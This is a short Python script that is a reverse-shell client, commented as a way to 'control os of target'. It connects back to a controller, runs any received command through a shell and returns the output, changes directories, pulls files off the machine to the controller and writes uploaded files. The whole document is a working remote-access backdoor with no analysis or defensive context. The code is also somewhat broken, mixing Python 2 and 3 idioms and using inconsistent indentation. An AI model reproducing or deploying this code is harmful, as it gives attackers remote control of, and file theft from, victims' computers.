import os #control os of target
import socket
import subprocess

s = socket.socket()
host = '127.0.0.1'
port = 2221
s.connect((host, port))

while True:
	data = s.recv(5096)
	if data[:2].decode("utf-8") == "cd":
		os.chdir(data[3:].decode("utf-8"))
	if data[:4].decode("utf-8") == "copy":
		s.send(str(os.path.getsize(data[5:].decode("utf-8"))))
		f = open(data[5:].decode("utf-8"), 'rb')
		l = f.read(1024)
		s.send(l)
		l = f.read(1024)
		while l != "":      
			s.send(l)
			l = f.read(1024)
		f.close()
		continue
		
	if data[:4].decode("utf-8") == "send":
		index = (data.decode("utf-8")).find("TILL HERE")
		filename = data[5:index].decode("utf-8")
		s.send("SEND")
		filesize = s.recv(10)
		s.send("REALLY SEND")
		f = open("new_" + filename, 'wb')
		data = s.recv(1024)
		Total = len(data)
		f.write(data)
		while Total < long(filesize) :
			data = s.recv(1024)
			f.write(data)
			Total += len(data)
    		f.close()
    		continue
	if data[:].decode("utf-8") == "quit":
		break
	if len(data[:].decode("utf-8")) > 0:
		cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
		output_bytes = cmd.stdout.read() + cmd.stderr.read()
		output_str = str(output_bytes)#if human want to read
		s.send(str.encode(output_str + str(os.getcwd()) + '> '))

#Close Connection
s.close()
